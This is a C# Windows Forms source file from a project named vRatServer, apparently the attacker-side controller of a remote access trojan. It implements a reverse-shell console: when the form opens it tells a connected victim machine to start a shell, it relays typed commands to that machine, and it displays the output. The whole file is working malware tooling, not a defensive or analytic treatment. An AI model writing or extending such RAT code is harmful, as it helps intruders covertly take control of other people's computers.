using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class ReverseShellform : Form
    {
        Client client;


        public void update_text(string txt)
        {
            richTextBox1.AppendText(txt);

        }
        public ReverseShellform(Client client)
        {
            this.client = client;
            this.client.rsf = this;
            InitializeComponent();
        }
        private void sendcommand(string txt)
        {

            
            if (txt == "cls")
            {
                richTextBox1.Text = "";
                return;
            }
            txt += "\n";
            byte[] mon = Encoding.UTF8.GetBytes(txt);
            globals.SendPacket(client, (byte)globals.PacketType.ReverseShellText, mon.Length, 0, ref mon);


        }
        private void ReverseShellform_Load(object sender, EventArgs e)
        {
            byte[]? r = null;
            
            globals.SendPacket(client, (byte)globals.PacketType.ReverseShellStart, 0, 0, ref r);
            textBox1.Focus();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void ReverseShellform_FormClosed(object sender, FormClosedEventArgs e)
        {
            this.client.rsf = null;
            sendcommand("exit");
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode.Equals(Keys.Enter))
            {
                sendcommand(textBox1.Text);
                textBox1.Text = "";
                e.SuppressKeyPress = true;


            }
        }
    }
}
